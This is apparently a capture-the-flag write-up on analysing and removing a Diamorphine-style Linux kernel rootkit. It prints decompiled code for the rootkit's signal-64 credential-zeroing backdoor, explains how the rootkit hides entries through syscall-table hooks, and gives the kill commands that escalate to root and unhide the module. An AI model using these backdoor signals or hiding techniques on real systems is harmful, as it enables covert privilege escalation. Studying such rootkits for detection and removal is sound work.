1. Scenario

Malicious actors have infiltrated the systems and are believed to have implanted a custom rootkit. The supplied diamorphine.ko module is a modified Diamorphine-style Linux rootkit. Its primary concealment marker is psychosis.

2. Initial Reconnaissance

The shell starts with limited terminal support:

cttyhack: can't open '/dev/ttyS0': No such file or directory
/bin/sh: can't access tty; job control turned off

Several normal commands also behave unexpectedly:

~ $ whoami
whoami: unknown uid 1000

~ $ cd /root
/bin/sh: cd: can't cd to /root: Permission denied

~ $ find / -type f -name '*.txt' 2>/dev/null
/bin/sh: can't create /dev/null: Permission denied

These symptoms suggest more than ordinary file permissions. The kernel itself is likely modifying process, file, or identity behavior.

3. Inspecting the Module

The module was examined outside the restricted shell using standard ELF and kernel-module tools:

file diamorphine.ko
modinfo diamorphine.ko
nm -an diamorphine.ko
readelf -S -s -r diamorphine.ko
strings -a diamorphine.ko
objdump -Mintel -drwC diamorphine.ko

file identifies it as an x86-64 relocatable ELF object with debug information. The module metadata identifies it as diamorphine, and the symbol table is still present.

Relevant functions include:

hacked_kill
hacked_getdents
hacked_getdents64
give_root
find_task
is_invisible
module_hide
module_show

The string psychosis appears in the read-only data section. Both directory-enumeration hooks compare directory entry names against this marker and remove matching entries before returning results to user space.

In practice, names beginning with psychosis are hidden from commands that rely on getdents or getdents64.

4. Backdoor Signals

The decompiled hacked_kill function checks for special signal values:

if (sig == 64) {
    struct cred *newcreds = prepare_creds();

    if (newcreds != NULL) {
        newcreds->uid.val = 0;
        newcreds->gid.val = 0;
        newcreds->euid.val = 0;
        newcreds->egid.val = 0;
        newcreds->suid.val = 0;
        newcreds->sgid.val = 0;
        newcreds->fsuid.val = 0;
        newcreds->fsgid.val = 0;
        commit_creds(newcreds);
    }
}

if (sig == 46) {
    /* Toggle module visibility. */
}

if (sig == 31) {
    /* Toggle process invisibility. */
}

Signal meanings:

Signal  Function
64      Set the calling process's UID/GID fields to zero
46      Show or hide the kernel module
31      Toggle the current process's invisible flag

The 0x40 branch grants root-like identity by cloning the current credentials, clearing the UID/GID fields, and installing the modified object with commit_creds().

5. Syscall Hooking

The module locates the system call table with a kprobe, saves original handlers, and replaces selected entries. The important targets are:

__NR_kill       -> hacked_kill
__NR_getdents   -> hacked_getdents
__NR_getdents64 -> hacked_getdents64

The directory hooks copy directory results into kernel memory, inspect each entry, and remove entries matching the psychosis prefix. This explains why ordinary listing and search tools cannot see the target directory.

6. Failed Attempts

Before identifying the module's signal interface, arbitrary signals did not help:

~ $ kill -41 1
sh: can't kill pid 1

~ $ whoami
unknown uid 1000

The environment remained restricted because signal 41 is not handled as the rootkit's privilege trigger.

7. Privilege Escalation

The decompiled signal handler showed that signal 64 invokes the credential-modification branch:

kill -64 1
whoami

Result:

root

The shell now has the permissions required to remove the module.

8. Removing the Rootkit

The module may be absent from lsmod because it removed itself from the kernel module list. If necessary, restore its visibility first:

kill -46 1
lsmod

Then unload it:

rmmod diamorphine

BusyBox rmmod produces no output on success. Removing the module restores the original syscall handlers and stops the directory-filtering behavior.

9. Finding the Hidden File

Before unloading the module, /opt appears empty:

ls /opt

After removal, search again:

find / -type f -name '*.txt' 2>/dev/null

The hidden file is revealed:

/opt/psychosis/flag.txt

Read it with:

cat /opt/psychosis/flag.txt

pumkin / challenges
